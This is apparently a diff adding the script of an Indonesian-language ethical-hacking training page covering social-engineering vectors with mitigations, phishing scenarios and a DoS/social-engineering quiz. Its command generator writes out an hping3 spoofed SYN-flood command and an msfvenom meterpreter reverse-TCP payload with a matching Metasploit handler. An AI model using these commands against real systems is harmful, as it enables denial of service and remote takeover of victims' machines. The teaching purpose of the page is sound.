+            equity: { title: 'Rule of Social Equity', desc: 'Kita cenderung percaya pada orang yang memiliki status sosial atau posisi yang setara atau lebih tinggi. Impersonation sebagai "rekan kerja" atau "atasan" memanfaatkan ini.' },
+            sympathy: { title: 'Rule of Sympathy', desc: 'Kita lebih mudah membantu orang yang dalam kesulitan. Attacker membuat skenario darurat ("saya terkunci di luar kantor, tolong bukakan pintu").'}, 
+            unavailability: { title: 'Rule of Unavailability', desc: 'Kita menginginkan sesuatu yang langka atau terbatas. Phishing dengan "akun Anda akan dinonaktifkan dalam 24 jam" memanfaatkan FOMO (Fear of Missing Out).' },
+            engagement: { title: 'Rule of Engagement & Consistency', desc: 'Setelah kita berkomitmen pada suatu tindakan, kita cenderung konsisten. Attacker meminta komitmen kecil dulu, lalu meminta yang lebih besar.' },
+            authority: { title: 'Rule of Authority', desc: 'Kita cenderung patuh pada otoritas. Serangan yang mengatasnamakan "IT Admin", "CEO", atau "Polisi" sangat efektif karena ini.' }
+        };
+
+        function showRule(element, ruleKey) {
+            document.querySelectorAll('.vector-item').forEach(i => i.classList.remove('active'));
+            element.classList.add('active');
+            const detail = document.getElementById('rule-detail');
+            document.getElementById('rule-title').textContent = rules[ruleKey].title;
+            document.getElementById('rule-desc').textContent = rules[ruleKey].desc;
+            detail.classList.add('show');
+        }
+
+        // Vector Details
+        const vectors = {
+            vishing: { title: 'Vishing (Voice Phishing)', desc: 'Phishing melalui panggilan telepon. Attacker menelepon korban sambil berpura-pura menjadi bank, support teknis, atau rekan kerja untuk mencuri informasi sensitif.', mitigation: 'Verifikasi nomor caller, jangan berikan OTP/pin via telepon, hubungi organisasi langsung melalui nomor resmi.' },
+            spear: { title: 'Spear Phishing', desc: 'Phishing yang sangat ditargetkan pada individu atau organisasi spesifik. Email disesuaikan dengan target menggunakan informasi yang dikumpulkan dari OSINT.', mitigation: 'Verifikasi sender, periksa header email, gunakan email gateway security, training karyawan.' },
+            software: { title: 'Interesting Software', desc: 'Menyebarkan malware yang dibungkus dalam software menarik (game crack, tool hacking, utility) yang di-download korban secara sukarela.', mitigation: 'Hanya download dari source resmi, verifikasi hash/signature, gunakan sandbox.' },
+            'baiting-tech': { title: 'Baiting', desc: 'Menarik korban dengan "umpan" fisik seperti USB drive yang ditinggalkan di tempat umum dengan label menarik ("Gaji 2024", "Rahasia").', mitigation: 'Jangan pernah colok USB tidak dikenal, disable autorun, gunakan endpoint protection.' },
+            watering: { title: 'Watering Hole Attack', desc: 'Menyusupi website yang sering dikunjungi target untuk menyebarkan malware. Korban "minum" dari "watering hole" yang tercemar.', mitigation: 'Keep browser updated, gunakan ad-blocker, isolasi browser untuk browsing umum.' },
+            'phishing-email': { title: 'Phishing & Trojan Email', desc: 'Email yang tampak dari sumber terpercaya mengandung link berbahaya atau attachment trojan.', mitigation: 'Email filtering, attachment sandboxing, user awareness, disable macros by default.' },
+            spam: { title: 'Spam Email', desc: 'Email massal yang tidak diminta, seringkali mengandung link phishing atau malware dalam attachment.', mitigation: 'Spam filter, blacklisting, user education.' },
+            popup: { title: 'Popup Window', desc: 'Pop-up browser yang mengatakan komputer terinfeksi virus dan menawarkan "scan" atau "support" palsu.', mitigation: 'Pop-up blocker, jangan pernah klik, tutup browser via Task Manager jika perlu.' },
+            tailgating: { title: 'Tailgating', desc: 'Mengikuti seseorang yang memiliki akses ke area terbatas tanpa menggunakan kartu akses sendiri.', mitigation: 'Mantrap, security guard, policy "no tailgating", CCTV.' },
+            pretexting: { title: 'Pretexting / Impersonation', desc: 'Membuat skenario palsu (pretext) untuk mendapatkan informasi. Misalnya berpura-pura menjadi auditor, petugas keamanan, atau vendor.', mitigation: 'Verifikasi identitas, policy need-to-know, security awareness.' },
+            hoaxing: { title: 'Hoaxing', desc: 'Menyebar informasi palsu untuk memancing reaksi atau mengalihkan perhatian. Bisa digunakan untuk mendukung serangan lain.', mitigation: 'Verify dari multiple sources, critical thinking, official communication channels.' },
+            authoritative: { title: 'Authoritative Voice', desc: 'Menggunakan nada otoritatif atau posisi hierarki untuk memaksa korban patuh tanpa bertanya.', mitigation: 'Culture yang memperbolehkan questioning authority, verification procedures.' },
+            'tech-expert': { title: 'Technical Expert', desc: 'Berpura-pura menjadi ahli teknis untuk membingungkan korban agar mengikuti instruksi berbahaya.', mitigation: 'Second opinion, escalation path, tidak malu bertanya.' },
+            smudge: { title: 'Smudge Attack', desc: 'Menganalisis sidik jari/minyak pada layar touchscreen untuk menebak pola unlock PIN/pattern.', mitigation: 'Gunakan PIN alphanumeric, fingerprint, atau face recognition. Bersihkan layar secara rutin.' },
+            dumpster: { title: 'Dumpster Diving', desc: 'Mengambil informasi sensitif dari sampah organisasi (dokumen, hard disk rusak, sticky notes).', mitigation: 'Shredding policy, secure disposal, clean desk policy.' },
+            shoulder: { title: 'Shoulder Surfing', desc: 'Mengintip dari bahu korban saat mengetik password atau membaca dokumen sensitif.', mitigation: 'Privacy screen, awareness of surroundings, 3-line policy.' },
+            spying: { title: 'Spying', desc: 'Mengamati target dari jarak jauh untuk mengumpulkan informasi tentang rutinitas, kebiasaan, atau kelemahan.', mitigation: 'OPSEC, tidak membicarakan sensitive info di tempat umum.' },
+            support: { title: 'Support Staff', desc: 'Menargetkan staff support (helpdesk, receptionist) yang seringkali memiliki akses luas dan diajarkan untuk "helpful".', mitigation: 'Support staff training, verification procedures, limited access.' }
+        };
+
+        function showVectorDetail(vectorKey) {
+            const panel = document.getElementById('vector-detail-panel');
+            const v = vectors[vectorKey];
+            document.getElementById('vector-detail-title').textContent = v.title;
+            document.getElementById('vector-detail-desc').textContent = v.desc;
+            document.getElementById('vector-detail-mitigation').innerHTML = '<strong style="color: var(--success);">🛡️ Mitigasi:</strong> ' + v.mitigation;
+            panel.classList.add('show');
+        }
+
+        // Command Generator
+        function generateCommand() {
+            const tool = document.getElementById('cmd-tool').value;
+            const ip = document.getElementById('cmd-ip').value;
+            const port = document.getElementById('cmd-port').value;
+            let cmd = '';
+
+            switch(tool) {
+                case 'nmap':
+                    cmd = `nmap -p- ${ip}`;
+                    break;
+                case 'hping3':
+                    cmd = `hping3 -S ${ip} -a [SPOOF_IP] -p ${port} --flood`;
+                    break;
+                case 'msfvenom':
+                    cmd = `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe > payload.exe`;
+                    break;
+                case 'msfhandler':
+                    cmd = `use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST ${ip}
+set LPORT ${port}
+exploit`;
+                    break;
+                case 'python-server':
+                    cmd = `python3 -m http.server ${port}
+# Akses via http://${ip}:${port}`;
+                    break;
+            }
+            document.getElementById('generated-cmd').textContent = cmd;
+        }
+
+        // Scenario Simulator
+        const scenarios = [
+            {
+                text: 'Anda menerima email dari "IT Support" dengan subject "Maintenance: Please update your password". Email berisi link yang mengarah ke halaman login yang tampak identik dengan portal perusahaan Anda, tetapi URL-nya adalah http://192.168.1.5. Apa yang Anda lakukan?',
+                options: [
+                    'Segera klik link dan update password karena email mengatakan "urgent"',
+                    'Abaikan email dan laporkan ke security team karena URL mencurigakan',
+                    'Klik link tapi jangan input password, hanya lihat tampilannya'
+                ],
+                correct: 1,
+                feedback: ['❌ Salah! URL dengan IP address adalah red flag utama phishing.', '✅ Benar! Selalu verifikasi URL dan laporkan ke security team.', '❌ Salah! Mengunjungi link phishing tetap berisiko (drive-by download, tracking).']
+            },
+            {
+                text: 'Seorang "teknisi printer" yang tidak Anda kenal datang ke kantor dan bilang "Saya dipanggil untuk service printer lantai 3". Receptionist sedang sibuk. Apa yang seharusnya dilakukan?',
+                options: [
+                    'Biarkan masuk karena dia pakai seragam dan bawa toolbox',
+                    'Tanyakan nama, perusahaan, dan verifikasi dengan IT department sebelum memberikan akses',
+                    'Suruh tunggu di lobby tanpa verifikasi lebih lanjut'
+                ],
+                correct: 1,
+                feedback: ['❌ Salah! Tailgating dan impersonation adalah teknik SE yang umum.', '✅ Benar! Selalu verifikasi identitas dan keperluan via channel resmi.', '⚠️ Kurang tepat. Walaupun menunggu di lobby lebih baik, verifikasi tetap diperlukan.']
+            },
+            {
+                text: 'Anda menemukan USB flash drive di parkiran kantor dengan label "Gaji Q3 2024 - Confidential". Apa tindakan terbaik?',
+                options: [
+                    'Segera colok ke laptop untuk melihat isinya',
+                    'Serahkan ke IT Security untuk scan dan identifikasi',
+                    'Beri ke rekan kerja yang lebih "ahli IT"'
+                ],
+                correct: 1,
+                feedback: ['❌ Salah! USB baiting adalah teknik SE klasik untuk menyebarkan malware.', '✅ Benar! USB tidak dikenal harus ditangani oleh security team.', '❌ Salah! Menyerahkan ke rekan tidak mengurangi risiko, malah memperluas exposure.']
+            },
+            {
+                text: 'Network monitoring menunjukkan spike traffic anomali pada port 445 dari single IP. CPU server mencapai 100%. Ini kemungkinan indikasi?',
+                options: [
+                    'DDoS attack dari botnet global',
+                    'SYN Flood DoS attack dari single source',
+                    'Normal traffic peak karena backup schedule'
+                ],
+                correct: 1,
+                feedback: ['❌ Salah! DDoS berasal dari multiple sources, bukan single IP.', '✅ Benar! Single source + port 445 + CPU 100% = karakteristik SYN Flood DoS.', '❌ Salah! Backup tidak menyebabkan traffic anomali dengan port reuse pattern.']
+            }
+        ];
+
+        let currentScenario = 0;
+
+        function handleScenario(scenarioIdx, optionIdx) {
+            if (scenarioIdx !== currentScenario) return;
+            const result = document.getElementById('scenario-result');
+            const isCorrect = optionIdx === scenarios[scenarioIdx].correct;
+
+            result.className = 'scenario-result show ' + (isCorrect ? 'correct' : 'wrong');
+            result.style.background = isCorrect ? 'rgba(0, 255, 157, 0.1)' : 'rgba(255, 42, 109, 0.1)';
+            result.style.border = '1px solid ' + (isCorrect ? 'var(--success)' : 'var(--secondary)');
+            result.style.color = isCorrect ? 'var(--success)' : 'var(--secondary)';
+            result.innerHTML = scenarios[scenarioIdx].feedback[optionIdx];
+        }
+
+        function nextScenario() {
+            currentScenario = (currentScenario + 1) % scenarios.length;
+            const s = scenarios[currentScenario];
+            document.getElementById('scenario-text').innerHTML = `<strong>Skenario ${currentScenario + 1}:</strong> ${s.text}`;
+            document.getElementById('scenario-options').innerHTML = s.options.map((opt, i) => 
+                `<button class="scenario-btn" onclick="handleScenario(${currentScenario}, ${i})"><strong>${String.fromCharCode(65+i)}.</strong> ${opt}</button>`
+            ).join('');
+            document.getElementById('scenario-result').classList.remove('show');
+        }
+
+        // Checklist
+        function updateChecklist() {
+            let dosCount = 0, seCount = 0;
+            for(let i=1; i<=5; i++) {
+                if(document.getElementById('chk'+i)?.checked) dosCount++;
+                if(document.getElementById('chk-se'+i)?.checked) seCount++;
+            }
+            document.getElementById('checklist-progress').textContent = `Progress: ${dosCount}/5`;
+            document.getElementById('checklist-se-progress').textContent = `Progress: ${seCount}/5`;
+        }
+
+        // Quiz System
+        const quizData = [
+            {
+                question: 'Apa perbedaan utama antara DoS dan DDoS attack?',
+                options: ['DoS lebih berbahaya daripada DDoS', 'DoS menggunakan satu sumber, DDoS menggunakan banyak sumber (botnet)', 'DoS menyerang hardware, DDoS menyerang software', 'Tidak ada perbedaan, keduanya sama'],
+                correct: 1
+            },
+            {
+                question: 'Teknik apa yang mengeksploitasi TCP Three-Way Handshake tanpa mengirim ACK final?',
+                options: ['Ping Flood', 'Smurf Attack', 'SYN Flooding', 'Ping of Death'],
+                correct: 2
+            },
+            {
+                question: 'Manakah yang BUKAN merupakan kategori serangan DoS?',
+                options: ['Buffer Overflow', 'Flood Attacks', 'SQL Injection', 'Ping of Death'],
+                correct: 2
+            },
+            {
+                question: 'Tool apa yang digunakan untuk membuat payload executable dalam Social Engineering?',
+                options: ['Wireshark', 'Msfvenom', 'KFSensor', 'Nmap'],
+                correct: 1
+            },
+            {
+                question: 'Apa tujuan utama dari Social Engineering?',
+                options: ['Merusak hardware target', 'Memanipulasi manusia untuk mendapatkan akses/data', 'Meningkatkan kecepatan network', 'Mengenkripsi data korban'],
+                correct: 1
+            },
+            {
+                question: 'Teknik apa yang digunakan untuk membuat website tiruan untuk mencuri credentials?',
+                options: ['Waterholing', 'Credential Harvesting / Site Cloning', 'Vishing', 'Tailgating'],
+                correct: 1
+            },
+            {
+                question: 'Berapa persen cybersecurity breaches disebabkan oleh human error menurut studi?',
+                options: ['50%', '75%', '95%', '30%'],
+                correct: 2
+            },
+            {
+                question: 'Tool apa yang digunakan untuk mendeteksi anomali traffic DoS pada Windows?',
+                options: ['Metasploit', 'KFSensor', 'SEToolkit', 'Hping3'],
+                correct: 1
+            },
+            {
+                question: 'Apa yang dimaksud dengan "Pretexting" dalam Social Engineering?',
+                options: ['Mengirim email spam', 'Membuat skenario palsu untuk mendapatkan informasi', 'Menyusupi website populer', 'Mengintip password dari bahu'],
+                correct: 1
+            },
+            {
+                question: 'Dalam konteks Social Engineering, apa itu "Tailgating"?',
+                options: ['Mengikuti seseorang masuk ke area terbatas tanpa akses', 'Mengirim SMS berbahaya', 'Membuat fake website', 'Menelepon korban sambil menyamar'],
+                correct: 0
+            }
+        ];
+
+        let currentQuestion = 0;
+        let score = 0;
+        let selectedAnswer = -1;
+        let answered = false;
+
+        function loadQuestion() {
+            const q = quizData[currentQuestion];
+            document.getElementById('quiz-question').textContent = q.question;
+            document.getElementById('quiz-options').innerHTML = q.options.map((opt, i) => 
+                `<div class="quiz-option" onclick="selectAnswer(${i})"><input type="radio" name="quiz" id="opt${i}"><label for="opt${i}">${opt}</label></div>`
+            ).join('');
+            document.getElementById('quiz-feedback').classList.remove('show');
+            document.getElementById('quiz-progress-text').textContent = `Question ${currentQuestion + 1}/${quizData.length}`;
+            document.getElementById('quiz-progress-fill').style.width = ((currentQuestion + 1) / quizData.length * 100) + '%';
+            document.getElementById('btn-check').style.display = 'inline-block';
+            document.getElementById('btn-next').style.display = 'none';
+            document.getElementById('btn-prev').style.display = currentQuestion > 0 ? 'inline-block' : 'none';
+            selectedAnswer = -1;
+            answered = false;
+        }
+
+        function selectAnswer(idx) {
+            if (answered) return;
+            selectedAnswer = idx;
+            document.querySelectorAll('.quiz-option').forEach((el, i) => {
+                el.style.borderColor = i === idx ? 'var(--primary)' : 'var(--border)';
+            });
+        }
+
+        function checkAnswer() {
+            if (selectedAnswer === -1) return;
+            answered = true;
+            const q = quizData[currentQuestion];
+            const isCorrect = selectedAnswer === q.correct;
+
+            if (isCorrect) score++;
+
+            document.querySelectorAll('.quiz-option').forEach((el, i) => {
+                if (i === q.correct) el.classList.add('correct');
+                else if (i === selectedAnswer && !isCorrect) el.classList.add('wrong');
+            });
+
+            const feedback = document.getElementById('quiz-feedback');
+            feedback.className = 'quiz-feedback show ' + (isCorrect ? 'correct' : 'wrong');
+            feedback.textContent = isCorrect ? '✅ Correct! ' + getExplanation(currentQuestion) : '❌ Wrong! Jawaban yang benar: ' + q.options[q.correct] + '. ' + getExplanation(currentQuestion);
+
+            document.getElementById('btn-check').style.display = 'none';
+            document.getElementById('btn-next').style.display = 'inline-block';
+        }
+
+        function getExplanation(qIdx) {
+            const explanations = [
+                'DoS menggunakan single connection/source, sedangkan DDoS menggunakan banyak sources (botnet) sehingga tidak bisa di-stop dengan block satu IP.',
+                'SYN Flooding mengirim SYN tanpa ACK, menyebabkan server mengonsumsi resource untuk half-open connections.',
+                'SQL Injection adalah serangan aplikasi web, bukan kategori DoS. DoS categories adalah Buffer Overflow dan Flood Attacks.',
+                'Msfvenom adalah payload generator di Metasploit Framework yang digunakan untuk membuat executable dengan backdoor.',
+                'Social Engineering memanfaatkan psikologi manusia, bukan kerentanan teknis, untuk mendapatkan akses atau data.',
+                'Site Cloning dengan SET (Social-Engineer Toolkit) membuat replica website untuk menangkap credentials korban.',
+                'Menurut studi yang disebutkan, 95% breaches disebabkan oleh human error. Jika issue ini solved, 9 dari 10 incident tidak akan terjadi.',
+                'KFSensor adalah network sensor/IDS untuk Windows yang memonitor anomali traffic dan connections.',
+                'Pretexting adalah membuat skenario palsu (seperti berpura-pura jadi auditor atau polisi) untuk mendapatkan informasi.',
+                'Tailgating adalah mengikuti seseorang yang memiliki akses ke area restricted tanpa menggunakan badge sendiri.'
+            ];
+            return explanations[qIdx];
+        }
+
+        function nextQuestion() {
+            currentQuestion++;
+            if (currentQuestion >= quizData.length) {
+                showQuizResult();
+            } else {
+                loadQuestion();
+            }
+        }
+
+        function prevQuestion() {
+            if (currentQuestion > 0) {
+                currentQuestion--;
+                loadQuestion();
+            }
+        }
+
+        function showQuizResult() {
+            document.getElementById('quiz-container').style.display = 'none';
+            document.getElementById('quiz-result').style.display = 'block';
+            document.getElementById('final-score').textContent = score;
+
+            let msg = '';
+            if (score === 10) msg = '🏆 Sempurna! Anda adalah Ethical Hacking Expert!';
+            else if (score >= 8) msg = '⭐ Sangat baik! Pemahaman Anda sudah advanced.';
+            else if (score >= 6) msg = '👍 Cukup baik. Review materi yang masih salah.';
+            else if (score >= 4) msg = '📚 Perlu belajar lebih banyak. Ulangi modul.';
+            else msg = '⚠️ Score rendah. Sangat disarankan untuk mempelajari ulang seluruh materi.';
+
+            document.getElementById('result-message').textContent = msg;
+        }
+
+        function restartQuiz() {
+            currentQuestion = 0;
+            score = 0;
+            document.getElementById('quiz-container').style.display = 'block';
+            document.getElementById('quiz-result').style.display = 'none';
+            loadQuestion();
+        }
+
+        // Progress tracking
+        function updateProgress() {
+            const sections = ['home', 'dos', 'soceng', 'labs', 'quiz'];
+            let visited = JSON.parse(localStorage.getItem('visitedSections') || '[]');
+            const current = document.querySelector('.section.active').id;
+            if (!visited.includes(current)) visited.push(current);
+            localStorage.setItem('visitedSections', JSON.stringify(visited));
+
+            const progress = (visited.length / sections.length) * 100;
+            document.getElementById('progress-fill').style.width = progress + '%';
+            document.getElementById('progress-text').textContent = Math.round(progress) + '%';
+        }
+
+        // Animated counters
+        function animateCounters() {
+            document.querySelectorAll('.stat-number').forEach(counter => {
+                const target = parseInt(counter.getAttribute('data-target'));
+                const duration = 2000;
+                const step = target / (duration / 16);
+                let current = 0;
+
+                const timer = setInterval(() => {
+                    current += step;
+                    if (current >= target) {
+                        counter.textContent = target + (target > 100 ? '' : '%');
+                        clearInterval(timer);
+                    } else {
+                        counter.textContent = Math.floor(current) + (target > 100 ? '' : '%');
+                    }
+                }, 16);
+            });
+        }
+
+        // Init
+        document.addEventListener('DOMContentLoaded', () => {
+            loadQuestion();
+            animateCounters();
+            updateProgress();
+        });
+    </script>
+</body>
+</html>
